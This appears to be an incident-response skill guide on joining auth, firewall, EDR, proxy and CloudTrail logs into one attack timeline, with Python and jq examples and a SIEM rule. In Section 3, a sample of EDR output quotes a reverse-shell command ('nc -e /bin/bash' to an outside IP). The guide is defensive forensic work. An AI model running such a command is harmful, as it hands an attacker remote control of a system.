---
name: incident-timeline-analysis-log-correlation
description: Use when you must join events across different log
  sources into one attack narrative during an authorized
  investigation. Covers normalizing timestamps and timezones,
  correlating authentication logs with proxy and firewall data using
  Python 3.12 and jq 1.7, tying EDR process ancestry to network
  events, following cloud trail through assumed roles, and writing
  correlation rules that survive review. Use when the parent
  incident-timeline-analysis workflow has timelines per source but no
  joined story, when proving that two events are the same attacker's
  work, or when building SIEM detections from incident findings.
version: 1.0.0
domain: incident
lifecycle: stable
last_verified: 2026-10-23
parent: incident-timeline-analysis
requires: [incident-timeline-analysis]
extends: []
relates: [incident-timeline-analysis]
tools:
  - name: Python
    version: 3.12
  - name: jq
    version: 1.7
  - name: Wireshark
    version: 4.2
---

Log correlation joins the "who logged in" with the "what connected
where" and the "which process did it" across sources that never
agreed on a format. It is the step that turns coincident timestamps
into a causal chain. This sub-skill covers the join keys that work
(time windows, IPs, usernames, process ids, session tokens), the
normalization that makes joins possible, and the common correlation
patterns for intrusion cases. Authorized systems only.

## Quick Workflow

1. List the sources and their native timestamp formats; convert
   everything to UTC ISO.
2. Pick join keys per source pair: time window plus IP, user,
   process, or session.
3. Start with the highest-confidence joins (same IP within
   minutes, EDR parent-child).
4. Build the chain outward: login to process to network to file.
5. Verify each link independently; one weak link breaks the chain.
6. Document the join logic so a reviewer can reproduce it.
7. Promote repeated patterns to SIEM detection rules.
8. Note what did not correlate; negative results bound the story.

## 1. Timestamp normalization

```bash
# Syslog (no year, local time): add year and convert
# "Oct 21 03:12:44 web-03 sshd[1234]: Accepted ..."
python3 - <<'EOF'
from datetime import datetime
line = "Oct 21 03:12:44 web-03 sshd[1234]: Accepted password for ops from 198.51.100.23"
ts = datetime.strptime("2026 " + " ".join(line.split()[:3]), "%Y %b %d %H:%M:%S")
print(ts.isoformat() + "Z")  # assume UTC per source inventory; adjust per host
EOF

# JSON logs with epoch: convert with jq
jq -r '[.timestamp, .src_ip, .user] | @tsv' edr-events.json | head -5
# If .timestamp is epoch seconds:
jq -r '[(.timestamp | strftime("%Y-%m-%dT%H:%M:%SZ")), .src_ip, .user] | @tsv' edr.json
```

Record the conversion per source in the case file. A correlation
built on unconverted timezones is fiction with citations.

## 2. Auth to network: the classic join

```python
# auth-to-net.py: logins followed by suspicious outbound connections
import re
from datetime import datetime, timedelta

logins = []
for line in open('auth.log'):
    m = re.search(r'(\w{3}\s+\d+ \d+:\d+:\d+).*Accepted \w+ for (\w+) from ([\d.]+)', line)
    if m:
        ts = datetime.strptime(f"2026 {m.group(1)}", "%Y %b %d %H:%M:%S")
        logins.append((ts, m.group(2), m.group(3)))

# Firewall log: ts, src, dst, dport (adapt to your format)
for line in open('firewall.log'):
    p = line.split()
    ts = datetime.strptime(p[0] + ' ' + p[1], "%Y-%m-%d %H:%M:%S")
    for login_ts, user, ip in logins:
        delta = (ts - login_ts).total_seconds()
        if p[2] == ip and 0 < delta < 900 and p[4] not in ('22', '443'):
            print(f"{ts} {user}@{ip} -> {p[3]}:{p[4]} ({delta:.0f}s after login)")
```

Example output shape:

```
2026-10-21 03:18:02 ops@198.51.100.23 -> 198.51.100.23:4444 (318s after login)
```

An SSH login followed five minutes later by an outbound connection
to a high port on the same external IP is the shape of a reverse
shell or a staging channel. Verify with the EDR process data
before calling it.

## 3. EDR process ancestry joins

```bash
# Find the process that made the suspicious connection (EDR JSON)
jq -r 'select(.dst_ip == "198.51.100.23" and .dst_port == 4444) |
  [.timestamp, .hostname, .process_name, .process_id, .parent_process_name] | @tsv' \
  edr-net.json

# Walk up the ancestry: who started that process
jq -r 'select(.process_id == 4242) |
  [.timestamp, .process_name, .parent_process_name, .parent_process_id, .command_line] | @tsv' \
  edr-process.json
```

Example output shape:

```
2026-10-21T03:18:02Z  web-03  nc  4242  sshd
2026-10-21T03:17:55Z  nc  sshd  1234  "nc -e /bin/bash 198.51.100.23 4444"
```

The chain is now complete: sshd accepted the login, sshd spawned
nc, nc connected out. Three sources, one story, each link
independently verifiable. This is the standard of proof for the
report.

## 4. Proxy to auth: user attribution for web traffic

```python
# proxy-to-auth.py: attribute proxy requests to authenticated users
# Proxy log: timestamp, src_ip, method, url; VPN log: timestamp, user, assigned_ip
from datetime import datetime

sessions = []  # (start, end, user, ip) from VPN logs
for line in open('vpn.log'):
    # "2026-10-21 03:10:00 CONNECT user=ops ip=10.8.0.14"
    p = dict(kv.split('=') for kv in line.split()[2:])
    sessions.append((line[:19], p['user'], p['ip']))

for line in open('proxy.log'):
    ts, src, method, url = line.split()[:4]
    for start, user, ip in sessions:
        if src == ip and ts >= start:
            print(f"{ts} {user} ({src}) {method} {url}")
            break
```

DHCP and VPN reassignment mean IP-to-user mapping expires; always
join on the lease window, never on a static IP-to-user table from
last month.

## 5. Cloud trail correlation

```bash
# Follow an assumed role through CloudTrail
jq -r 'select(.userIdentity.arn | contains("ops")) |
  [.eventTime, .eventName, .sourceIPAddress, .userIdentity.type] | @tsv' \
  cloudtrail.json | sort | head -20

# Look for the classic sequence: GetSessionToken then unusual API calls
jq -r 'select(.eventName == "AssumeRole" or .eventName == "GetSessionToken") |
  [.eventTime, .requestParameters.roleArn, .sourceIPAddress] | @tsv' cloudtrail.json
```

Correlate the source IP with your VPN and auth logs: an AssumeRole
from an IP that never appears in your VPN logs is an external
caller with stolen credentials until proven otherwise.

## 6. From correlation to detection

Every verified correlation is a future SIEM rule. Write it while the
case is fresh:

```
Rule: SSH login followed by outbound high-port connection (15 min window)
Logic: auth Accepted for $user from $ip, then firewall ALLOW $ip -> external:>1024
Tuning: exclude known admin jump hosts and backup destinations
ATT&CK: T1078 -> T1048/T1059
```

Test the rule against 30 days of history before deploying: if it
fires on normal admin work, tune the window or the port list, do
not ship a noisy rule.

## Edge cases

- NAT hides the true source IP. Correlate on the NAT translation
  logs too, or the join attributes the wrong internal host.
- Clock skew between sources exceeds your join window. Measure and
  correct skew first (parent skill); widening the window instead
  just adds false joins.
- The attacker used the same credentials as legitimate admins.
  Distinguish by source IP, unusual hours, and tooling artifacts;
  the join keys must include something the attacker cannot fake
  as easily as a password.
- Log formats change mid-incident (agent upgrade). Parse
  defensively: match on multiple field patterns and log parse
  failures.
- Encrypted traffic gives you IPs and ports but no URLs. The
  correlation still works on metadata; note the content gap.
- High-volume sources drown the join (proxy logs at millions of
  lines). Pre-filter to the incident entities (IPs, users, hosts)
  before joining.

## Escalation

- A correlation implicates a production service account used by
  automation. Distinguish attacker use from automation by behavior
  (automation is periodic and predictable); involve the service
  owner before disabling anything.
- Joins suggest the attacker moved through a system with no logs
  at all. Escalate the visibility gap; the next host in the chain
  needs EDR or the investigation flies blind.
- Correlation output will support disciplinary action. Raise the
  evidence bar: each link independently verified, methodology
  documented, second reviewer on the chain.
- The pattern matches an ongoing campaign, not a single incident.
  Escalate to threat intel for campaign tracking; your SIEM rule
  becomes fleet-wide.

## Detection and defender view

Correlation is what SIEMs are for, and every manual join in this
sub-skill is a detection waiting to be automated. The defender
investments are normalized timestamps everywhere (UTC, NTP),
consistent entity identifiers across sources (same hostname in
every log), and centralization so joins do not require scp-ing
files between hosts. The maturity test: can your SOC run the
auth-to-network join in under five minutes from the console. If
not, the tooling, not the analysts, is the bottleneck.

## Key references

- Parent workflow: incident-timeline-analysis (this repo)
- Plaso and psort: https://plaso.readthedocs.io/
- MITRE ATT&CK: https://attack.mitre.org/
- NIST SP 800-92 (log management):
  https://csrc.nist.gov/publications/detail/sp/800-92/final
- jq manual: https://jqlang.github.io/jq/manual/
- Elastic Common Schema (normalization reference):
  https://www.elastic.co/guide/en/ecs/current/index.html
